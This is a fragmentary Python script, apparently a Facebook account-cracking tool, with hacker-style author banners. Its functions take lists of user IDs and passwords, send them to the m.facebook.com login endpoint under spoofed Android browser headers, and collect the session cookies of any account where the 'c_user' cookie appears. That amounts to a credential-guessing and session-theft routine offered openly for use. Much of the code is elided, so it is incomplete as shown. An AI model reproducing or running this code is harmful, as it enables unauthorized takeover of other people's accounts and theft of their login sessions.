#created by xerx aka Shiva king
#open source by xerx
#github= XERX-XD
#BROKEN USER SHIVA KING 
#JAI Mahakal 
# https://www.facebook.com/profile.php?id=100088103852576&mibextid=ZbWKwL
...
/_______  /|___|  /__| \_/  (____  /
        \/      \/               \/ 
[+]==============================================
[+] CREATED BY   :  PANDIT JI 
[+] FB GROUP     :  NAHI H 
[+] BROTHER   :    RAJAT X YUVAN X ZAKHMI 
[+] TOOL STATUS  :  RANDOM
[+] TOOL VIRSION :  0.1
[+]=============================================="""
...
def mbasic(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Infinix HOT 4 Lite Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.127 Mobile Safari/537.36',}
...
def p(uid,pwx,tl):
    ...
    'priority':'u=0',
    'upgrade-insecure-requests':'1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.3',
			'user-agent': pro}
...
'sec-ch-ua-mobile': '?1', 'sec-ch-ua-model': '"CPH1909"', 'sec-ch-ua-platform': '"Android"', 
...
'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'}
			...
			lo = session.post('https://m.facebook.com/login/reference-based/regular/login/?refsrc=deprecated&lemp=v',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			#print(iid+'|'+pws+'|'+str(log_cookies))
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
